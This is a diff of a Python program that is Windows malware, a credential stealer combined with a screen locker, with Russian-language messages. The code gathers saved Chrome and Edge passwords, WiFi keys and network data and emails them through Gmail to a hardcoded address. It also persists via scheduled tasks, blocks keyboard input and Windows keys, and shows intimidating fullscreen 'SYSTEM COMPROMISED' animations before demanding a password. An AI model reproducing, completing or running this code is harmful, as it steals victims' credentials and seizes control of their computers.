@@ -9,7 +9,6 @@ import cv2, numpy as np
 from PIL import ImageGrab
 import sqlite3, win32crypt, shutil, winreg, ctypes
 
-# ===== НАСТРОЙКИ =====
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
 GMAIL_LOGIN = "xzx78848@gmail.com"
@@ -21,55 +20,29 @@ VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== УБИЙЦА ВСЕХ ПРОЦЕССОВ =====
-def kill_all_apps():
-    exclude = ['System','smss.exe','csrss.exe','wininit.exe','winlogon.exe','services.exe','lsass.exe','svchost.exe','dwm.exe','python.exe','pythonw.exe','explorer.exe']
-    while True:
-        try:
-            result = subprocess.check_output('tasklist /FO CSV /NH', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-            for line in result.split('\n'):
-                if line.strip():
-                    parts = line.replace('"','').split(',')
-                    if len(parts) >= 1:
-                        proc = parts[0].strip().lower()
-                        if proc not in [e.lower() for e in exclude] and proc.endswith('.exe'):
-                            os.system(f'taskkill /f /im {proc} >nul 2>&1')
-        except: pass
-        time.sleep(0.05)
-
-# ===== БЛОКИРОВКА ВСЕГО =====
 def block_everything():
     try:
         import keyboard
-        all_keys = ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','volume up','volume down','volume mute','delete']
-        for k in all_keys:
+        for k in ['alt','ctrl','shift','tab','caps lock','esc','f1','f2','f3','f4','f5','f6','f7','f8','f9','f10','f11','f12','print screen','scroll lock','pause','insert','home','end','page up','page down','up','down','left','right','windows','left windows','right windows','delete']:
             try: keyboard.block_key(k)
             except: pass
-        combos = ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i']
-        for c in combos:
+        for c in ['alt+f4','alt+tab','alt+esc','alt+space','ctrl+shift+esc','ctrl+alt+del','ctrl+esc','ctrl+w','ctrl+f4','ctrl+tab','ctrl+c','ctrl+v','win','win+d','win+r','win+e','win+l','win+m','win+tab','win+x','win+u','win+i']:
             try: keyboard.add_hotkey(c, lambda: None, suppress=True, timeout=0)
             except: pass
-        try:
-            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
-            winreg.CloseKey(k)
-        except: pass
-    except:
-        ctypes.windll.user32.BlockInput(True)
+        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
+    except: ctypes.windll.user32.BlockInput(True)
 
 def unblock_all():
     try: ctypes.windll.user32.BlockInput(False)
     except: pass
-    try:
-        import keyboard; keyboard.unhook_all()
+    try: import keyboard; keyboard.unhook_all()
     except: pass
     try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0)
-        winreg.CloseKey(k)
+        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
     except: pass
 
-# ===== АВТОЗАГРУЗКА ВЕЗДЕ =====
 def add_to_startup():
     try:
         cp = os.path.abspath(__file__)
@@ -95,15 +68,58 @@ def add_to_startup():
         os.system(f'schtasks /create /tn "WindowsService" /tr "\\"{pythonw}\\" \\"{cp}\\"" /sc ONLOGON /rl HIGHEST /f >nul 2>&1')
     except: pass
 
-# ===== СКАЧИВАНИЕ =====
 def download_file(url, path):
     try:
         if os.path.exists(path): os.remove(path)
         urllib.request.urlretrieve(url, path)
     except: pass
 
-# ===== ВИДЕО (НЕЛЬЗЯ ЗАКРЫТЬ) =====
-def play_video_blocking():
+def anim_fsociety():
+    a = tk.Tk()
+    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a.configure(bg='black'); a.overrideredirect(True)
+    lbl = tk.Label(a, text="", bg='black', fg='white', font=('Courier', 50, 'bold'))
+    lbl.pack(expand=True)
+    for t in ["f","f s","f s o","f s o c","f s o c i","f s o c i e","f s o c i e t","f s o c i e t y"]:
+        lbl.config(text=t); a.update(); time.sleep(0.3)
+    time.sleep(1)
+    sub = tk.Label(a, text="", bg='black', fg='#ff4444', font=('Courier', 20))
+    sub.pack(pady=20)
+    notice = "тебя заметила"
+    for i in range(len(notice)+1):
+        sub.config(text=notice[:i]); a.update(); time.sleep(0.1)
+    time.sleep(2); a.destroy()
+
+def anim_stealer():
+    a = tk.Tk()
+    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a.configure(bg='black'); a.overrideredirect(True)
+    tk.Label(a, text="Стиллер ворует данные...", bg='black', fg='white', font=('Courier', 20, 'bold')).pack(expand=True, pady=(0,50))
+    bar = tk.Canvas(a, width=400, height=30, bg='black', highlightthickness=1, highlightbackground='white')
+    bar.pack()
+    bar_text = tk.Label(a, text="0%", bg='black', fg='white', font=('Courier', 12))
+    bar_text.pack(pady=10)
+    info = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 10))
+    info.pack()
+    for percent, text in [(10,"Поиск паролей Chrome..."),(20,"WiFi пароли..."),(30,"Сканирование сети..."),(45,"Копирование cookies..."),(60,"Сбор IP адресов..."),(75,"Кража файлов..."),(90,"Отправка на сервер..."),(100,"ГОТОВО!")]:
+        bar.delete('all')
+        bar.create_rectangle(0, 0, 400*percent/100, 30, fill='#0f0', outline='')
+        bar_text.config(text=f"{percent}%"); info.config(text=text)
+        a.update(); time.sleep(0.5)
+    time.sleep(2); a.destroy()
+
+def anim_connect():
+    a = tk.Tk()
+    a.attributes('-fullscreen', True); a.attributes('-topmost', True)
+    a.configure(bg='black'); a.overrideredirect(True)
+    lbl = tk.Label(a, text="", bg='black', fg='#0f0', font=('Courier', 14), justify='left')
+    lbl.pack(expand=True)
+    current = ""
+    for line in ["[*] Establishing connection...","[*] Connecting to Windows kernel...","[*] Bypassing security...","[*] Access granted!","[*] Mounting system...","[*] Connected to: " + socket.gethostname(),"[*] IP: " + socket.gethostbyname(socket.gethostname()),"","[✓] SYSTEM COMPROMISED"]:
+        current += line + "\n"; lbl.config(text=current); a.update(); time.sleep(0.4)
+    time.sleep(3); a.destroy()
+
+def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
     time.sleep(0.5)
@@ -111,8 +127,7 @@ def play_video_blocking():
         v = tk.Tk()
         v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
-        v.protocol("WM_DELETE_WINDOW", lambda: None); v.focus_force()
-        threading.Thread(target=kill_all_apps, daemon=True).start()
+        v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
         try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except: pass
@@ -135,21 +150,16 @@ def play_video_blocking():
         v.destroy()
     except: pass
 
-# ===== СТИЛЕР =====
 def mega_steal():
     report = ["="*60, "DEDSEK STEALER", "="*60]
     report.append(f"USER: {os.environ.get('USERNAME')} | PC: {socket.gethostname()}")
-    try:
-        report.append(f"PUBLIC IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
+    try: report.append(f"PUBLIC IP: {urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode()}")
     except: pass
     try: report.append(f"LOCAL IP: {socket.gethostbyname(socket.gethostname())}")
     except: pass
     try: report.append("\nNETWORK:\n" + subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')[:2000])
     except: pass
-    for browser, path in [
-        ("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),
-        ("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))
-    ]:
+    for browser, path in [("CHROME", os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')),("EDGE", os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'))]:
         if os.path.exists(path):
             report.append(f"\n=== {browser} ===")
             try:
@@ -175,20 +185,11 @@ def mega_steal():
                 if p:
                     det = subprocess.check_output(f'netsh wlan show profile name="{p}" key=clear', shell=True, stderr=subprocess.DEVNULL).decode('cp866','replace')
                     for dl in det.split('\n'):
-                        if 'Содержимое ключа' in dl:
-                            report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
-    except: pass
-    try:
-        ss = os.path.join(tempfile.gettempdir(), 'desktop.jpg')
-        ImageGrab.grab().save(ss, 'JPEG', quality=50)
-        send_file_email(ss, "[DedSek_Logs] Screenshot")
-        try: os.remove(ss)
-        except: pass
+                        if 'Содержимое ключа' in dl: report.append(f"WiFi: {p} | PASS: {dl.split(':')[1].strip()}")
     except: pass
     report.append(f"\nTIME: {time.strftime('%d.%m.%Y %H:%M:%S')}")
     text = '\n'.join(report)
-    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]):
-        send_email(part, f"[DedSek_Logs] [{i+1}]")
+    for i, part in enumerate([text[i:i+15000] for i in range(0, len(text), 15000)]): send_email(part, f"[DedSek_Logs] [{i+1}]")
 
 def send_email(msg, subj=None):
     try:
@@ -198,21 +199,6 @@ def send_email(msg, subj=None):
         s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
     except: pass
 
-def send_file_email(fp, desc):
-    try:
-        if not os.path.exists(fp): return
-        m = MIMEMultipart()
-        m['Subject'] = desc; m['From'] = GMAIL_LOGIN; m['To'] = RECEIVER_EMAIL
-        with open(fp, 'rb') as f:
-            p = MIMEBase('application', 'octet-stream'); p.set_payload(f.read())
-            encoders.encode_base64(p)
-            p.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(fp)}"')
-            m.attach(p)
-        s = smtplib.SMTP_SSL('smtp.gmail.com', 465, timeout=10)
-        s.login(GMAIL_LOGIN, GMAIL_APP_PASSWORD); s.send_message(m); s.quit()
-    except: pass
-
-# ===== ВИНЛОКЕР (ЧЁРНО-БЕЛЫЙ) =====
 class WinLocker:
     def __init__(self):
         self.root = tk.Tk(); self.root.withdraw()
@@ -243,7 +229,6 @@ class WinLocker:
 У ТЕБЯ {MAX_ATTEMPTS} ПОПЫТКИ."""
         
         tk.Label(self.win, text=msg, bg='black', fg='white', font=('Courier',10,'bold'), justify='left').place(relx=0.5, rely=0.38, anchor='center')
-        
         cf = tk.Frame(self.win, bg='black'); cf.place(relx=0.5, rely=0.8, anchor='center')
         tk.Label(cf, text="ВВЕДИ ПАРОЛЬ:", bg='black', fg='white', font=('Courier',14,'bold')).pack(pady=(0,5))
         self.pw = tk.Entry(cf, show="*", font=('Courier',14,'bold'), bg='white', fg='black', relief='solid', bd=2)
@@ -269,12 +254,13 @@ class WinLocker:
             else: self.sl.config(text="404 | ОШИБКА", fg='white'); self.win.after(2000, lambda: os._exit(0))
             self.pw.delete(0, tk.END)
 
-# ===== MAIN =====
 if __name__ == "__main__":
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
-    threading.Thread(target=kill_all_apps, daemon=True).start()
-    play_video_blocking()
+    anim_fsociety()
+    anim_stealer()
+    anim_connect()
+    play_video()
     block_everything()
     WinLocker()
     tk.mainloop()
